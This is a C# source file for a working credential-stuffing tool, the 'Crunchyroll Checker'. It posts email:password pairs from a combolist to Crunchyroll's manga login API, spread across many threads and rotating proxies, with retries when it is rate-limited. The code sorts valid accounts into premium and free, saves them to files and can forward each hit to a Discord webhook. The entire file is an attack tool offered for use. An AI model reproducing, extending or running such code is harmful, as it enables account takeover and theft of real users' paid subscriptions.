using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using Leaf.xNet;
using System.Net;
using System.Collections.Specialized;
using System.Diagnostics;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Crunchyroll_Checker
{
    class Program
    {
        public static int hits;
        public static int bad;
        public static int proxyError;
        public static int checkedz;
        public static int combo_amount;
        public static int premuim;
        public static int free;
        public static int ratelimited;



        public static int timeout;
        public static bool makesoundonhit;

        public static ParallelLoopResult parallelLoop;

        public static List<string> combolist = new List<string>();
        public static List<string> proxyList = new List<string>();


        public static int threads;
        public static string proxyType;
        public static string currentTmie = DateTime.Now.ToString("dd-MM-yyyy hh-mm-ss");
        public static string webhookURL = string.Empty;

        public static string wulu = @"
                                    ____    __    ____  __    __   __       __    __  
                                    \   \  /  \  /   / |  |  |  | |  |     |  |  |  | 
                                     \   \/    \/   /  |  |  |  | |  |     |  |  |  | 
                                      \            /   |  |  |  | |  |     |  |  |  | 
                                       \    /\    /    |  `--'  | |  `----.|  `--'  | 
                                        \__/  \__/      \______/  |_______| \______/   
            ";

        [STAThread]
        static void Main(string[] args)
        {

            try
            {
                dynamic JSONfile = JsonConvert.DeserializeObject(File.ReadAllText("config.json"));

                int json = JSONfile["timeout"];
                bool sound = JSONfile["make_sound_when_hit"];
                timeout = json;
                makesoundonhit = sound;
            } catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            Control.CheckForIllegalCrossThreadCalls = false;

            Directory.CreateDirectory(Environment.CurrentDirectory + @"\\Results\\");
            Console.Title = "Crunchyroll Checker WITH CAPTURE by wulu#0827";

            Console.WriteLine(String.Format("{0," + Console.WindowWidth / 2 + "}", wulu), Console.ForegroundColor = ConsoleColor.Red);

            Console.WriteLine("[?] How many threads to use?");
            Console.Write("> ", Console.ForegroundColor = ConsoleColor.Magenta);
            threads = Convert.ToInt32(Console.ReadLine());

            Console.WriteLine("[?] What type of proxy to use? [1] HTTP [2] SOCKS4 [3] SOCKS5", Console.ForegroundColor = ConsoleColor.Red);
            Console.Write("> ", Console.ForegroundColor = ConsoleColor.Magenta);
            string a = Console.ReadLine();

            switch (a)
            {
                case "1":
                    proxyType = "HTTP";
                    break;
                case "2":
                    proxyType = "SOCKS4";
                    break;
                case "3":
                    proxyType = "SOCKS5";
                    break;
            }
            Thread.Sleep(700);
            Console.Clear();

            Console.WriteLine(String.Format("{0," + Console.WindowWidth / 2 + "}", wulu), Console.ForegroundColor = ConsoleColor.Red);

            Console.WriteLine("[!] Open a combolist.", Console.ForegroundColor = ConsoleColor.Red);
            Console.Write("> ", Console.ForegroundColor = ConsoleColor.Magenta);

            OpenFileDialog combo = new OpenFileDialog();
            combo.Filter = "Text files (*.txt)|*.txt";
            combo.Title = "Open a combolist";
            if (combo.ShowDialog() == DialogResult.OK)
            {
                foreach (string code in File.ReadAllLines(combo.FileName))
                {
                    combolist.Add(code);
                }
            }

            combo_amount = combolist.Count();

            Console.Write($"Found {combolist.Count.ToString()} accounts." + Environment.NewLine);

            Console.WriteLine("[!] Open a proxy file.", Console.ForegroundColor = ConsoleColor.Red);
            Console.Write("> ", Console.ForegroundColor = ConsoleColor.Magenta);

            OpenFileDialog proxyfile = new OpenFileDialog();
            proxyfile.Filter = "Text files (*.txt)|*.txt";
            proxyfile.Title = "Open a proxy file";

            if (proxyfile.ShowDialog() == DialogResult.OK)
            {
                foreach (string code in File.ReadAllLines(proxyfile.FileName))
                {
                    proxyList.Add(code);
                }
            }

            Console.Write($"Found {proxyList.Count.ToString()} proxies.", Console.ForegroundColor = ConsoleColor.Red);

            Console.Clear();

            Console.WriteLine(String.Format("{0," + Console.WindowWidth / 2 + "}", wulu), Console.ForegroundColor = ConsoleColor.Red);

            Console.WriteLine("[?] Do you want to use a Discord webhook? [1] YES [2] NO", Console.ForegroundColor = ConsoleColor.Red);
            Console.Write("> ", Console.ForegroundColor = ConsoleColor.Magenta);
            string decision = Console.ReadLine();
            switch (decision)
            {
                case "1":
                    Console.WriteLine("[?] Enter your webhook URL", Console.ForegroundColor = ConsoleColor.Red);
                    Console.Write("> ", Console.ForegroundColor = ConsoleColor.Magenta);
                    webhookURL = Console.ReadLine();
                    break;
                case "2":
                    break;
            }

            Console.Clear();

            Console.WriteLine(String.Format("{0," + Console.WindowWidth / 2 + "}", wulu), Console.ForegroundColor = ConsoleColor.Red);


            Thread thread = new Thread(seperateThread);
            thread.Start();

            while (!parallelLoop.IsCompleted)
            {


                if (parallelLoop.IsCompleted)
                {
                    Console.WriteLine($"Finished checking accounts. Results: | Remaining: {checkedz}/{combo_amount.ToString()} | Hits: {hits} | Bad: {bad} | Premuim: {premuim} | Free: {free} | Proxy Error: {proxyError} | Rate Limited: {ratelimited} ");
                    Console.ReadLine();
                }
            }
        }

        public static string ToFormData(IDictionary<string, object> dict)
        {
            var list = new List<string>();

            foreach (var item in dict)
                list.Add(item.Key + "=" + item.Value);

            return string.Join("&", list);
        }
        public static string randomProxy()
        {
            Random random = new Random();
            string[] ararayProx = proxyList.ToArray();
            int indexx = random.Next(ararayProx.Length);
            return ararayProx[indexx];
        }

        public static void checkaccount(string account)
        {
            Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest();
            httpRequest.UserAgent = Http.ChromeUserAgent();

            httpRequest.UseCookies = true;
            string email;
            string password;

            try
            {
                email = account.Split(':')[0];
                password = account.Split(':')[1];
            }
            catch (Exception ex)
            {
                return;
            }

            httpRequest.AddHeader("User-Agent", httpRequest.UserAgent);
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            httpRequest.AddHeader("Host", "api-manga.crunchyroll.com");
            httpRequest.AddHeader("Accept-Encoding", "gzip");

            var dict = new Dictionary<string, object>
            {
                { "device_type", "com.crunchyroll.manga.android" },
                { "device_id", "996f20f5e235e2b6" },
                { "access_token", "FLpcfZH4CbW4muO&api_ver=1.0" },
                { "account", email },
                { "password", password },

            };

            try
            {
                if (proxyType == "HTTP")
                {
                    httpRequest.Proxy = HttpProxyClient.Parse(randomProxy());
                    httpRequest.Proxy.ConnectTimeout = timeout;
                }
                else if (proxyType == "SOCKS4")
                {
                    httpRequest.Proxy = Socks4ProxyClient.Parse(randomProxy());
                    httpRequest.Proxy.ConnectTimeout = timeout;
                }
                else if (proxyType == "SOCKS5")
                {
                    httpRequest.Proxy = Socks5ProxyClient.Parse(randomProxy());
                    httpRequest.Proxy.ConnectTimeout = timeout;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Check your proxies.");
            }

            try
            {
                string url = "https://api-manga.crunchyroll.com/cr_login";

                var response = httpRequest.Post(url, ToFormData(dict), "application/x-www-form-urlencoded");

                if (response.ToString().Contains("user_id"))
                {
                    hits += 1;
                    checkedz += 1;

                    if(response.ToString().Contains("fan") || (response.ToString().Contains("anime")))
                    {
                        Console.WriteLine($"[+] {account} PREMUIM", Console.ForegroundColor = ConsoleColor.Yellow);
                        premuim += 1;
                        writepremium(account);
                        if (!webhookURL.Equals(string.Empty))
                        {
                            sendWebhookMSG(webhookURL, "Crunchyroll checker.", $"{account} PREMUIM");
                        }
                        if (makesoundonhit)
                        {
                            Console.Beep();
                        }
                    }
                    else if(response.ToString().Contains("user_id") && response.ToString().Contains("fan") != true)
                    {
                        Console.WriteLine($"[/] {account} FREE", Console.ForegroundColor = ConsoleColor.DarkGreen);
                        free += 1;
                        writefree(account);
                        if (!webhookURL.Equals(string.Empty))
                        {
                            sendWebhookMSG(webhookURL, "Crunchyroll checker.", $"{account} FREE");
                        }
                        if (makesoundonhit)
                        {
                            Console.Beep();
                        }
                    }
                }
                else if (response.ToString().Contains("Incorrect login information"))
                {
                    Console.WriteLine($"[-] {account} ", Console.ForegroundColor = ConsoleColor.Red);
                    checkedz += 1;
                    bad += 1;
                }
            } 
            catch(Exception ex)
            {

                if(ex.Message.Contains("Unable to connect"))
                {
                    proxyError += 1;
                   
                    checkaccount(account);
                   
                }

                if (ex.Message.Contains("406"))
                {
                    ratelimited += 1;
                    checkaccount(account);
                }
            }
        }

        public static void writefree(string code)
        {
            string file = Environment.CurrentDirectory + @"\\Results\\[Free] " + currentTmie + ".txt";
            File.AppendAllText(file, code + Environment.NewLine);
        }

        public static void writepremium(string code)
        {
            string file = Environment.CurrentDirectory + @"\\Results\\[Premium] " + currentTmie + ".txt";
            File.AppendAllText(file, code + Environment.NewLine);
        }

        public static void sendWebhookMSG(string url, string user, string content)
        {
            WebClient wc = new WebClient();
            try
            {
                wc.UploadValues(url, new NameValueCollection
                {
                    {
                        "content", content
                    },
                    {
                        "username", user
                    }
                });
            }
            catch (WebException ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
 
        public static void seperateThread()
        {
            parallelLoop = Parallel.ForEach(combolist, line =>
            {
                new ParallelOptions
                {
                    MaxDegreeOfParallelism = threads
                };

                checkaccount(line);
                Console.Title = $"Crunchyroll Checker by wulu#0827 | Remaining: {checkedz}/{combo_amount.ToString()} | Hits: {hits} | Bad: {bad} | Premuim: {premuim} | Free: {free} | Proxy Error: {proxyError} | Rate Limited: {ratelimited}";
            });
        }
    }
}